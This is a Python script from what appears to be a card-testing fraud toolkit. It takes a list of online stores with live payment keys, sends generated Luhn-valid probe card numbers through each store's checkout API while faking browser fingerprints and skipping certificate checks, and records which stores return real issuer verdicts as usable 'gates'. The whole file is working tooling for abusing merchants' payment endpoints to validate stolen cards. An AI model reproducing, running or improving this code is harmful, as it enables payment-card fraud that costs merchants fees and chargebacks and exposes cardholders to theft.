# language: python, file: scratch/_verify_all_store.py — верификация всех STORE_LIVE гейтов
# критерий: store_gate вернул эмитентный вердикт (DECLINED/*APPROVED*/INVALID/...),
# а не ERROR инфраструктуры. итог — data/store_gates.json с полем verified.
import asyncio
import json
import re
import sys

import gate_client as gc
import config
from store_gate import bin_lookup

from curl_cffi.requests import AsyncSession

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

VERDICT_RE = re.compile(
    r"^(APPROVED|DECLINED|3DS|EXPIRED|INVALID|WRONG_CVC|RESTRICTED|RATE_LIMITED|RETRY|TEST_MODE)")

# гейты с эмитентным вердиктом
GOOD, BAD = [], []


async def verify(gate: dict, sem: asyncio.Semaphore) -> dict:
    root = gate["base_url"]
    async with sem:
        try:
            async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as s:
                res = await gc.store_api_confirm(s, root, gate.get("pk_live", ""),
                                                 gc.card_raw_from_probe(), country="US",
                                                 max_price_cents=3000)
        except Exception as e:
            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:120]}
    ok = bool(VERDICT_RE.match(res.get("status", "")))
    gate = dict(gate)
    gate["verified"] = ok
    gate["verify_status"] = res.get("status", "")
    gate["verify_detail"] = str(res.get("detail", ""))[:120]
    (GOOD if ok else BAD).append(gate)
    icon = "✅" if ok else "❌"
    print(f"{icon} {root:38} {res.get('status', '?'):14} {gate['verify_detail'][:70]}")
    return gate


async def main():
    with open("data/store_gates.json", encoding="utf-8") as f:
        gates = json.load(f)
    print(f"[*] Verifying {len(gates)} STORE_LIVE gates (probe card, $30 cap)")
    print("=" * 80)
    sem = asyncio.Semaphore(8)
    results = await asyncio.gather(*[verify(g, sem) for g in gates])

    with open("data/store_gates.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)

    print("=" * 80)
    print(f"[🔥] VERIFIED EMITTER-VERDICT GATES: {len(GOOD)} / {len(results)}")


if __name__ == "__main__":
    # probe-карта: Luhn-валидный номер из _PROBE_BINS — эмитент отклонит без списания
    def _probe_raw():
        p = gc.gen_probe_card()
        return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"
    gc.card_raw_from_probe = _probe_raw
    asyncio.run(main())
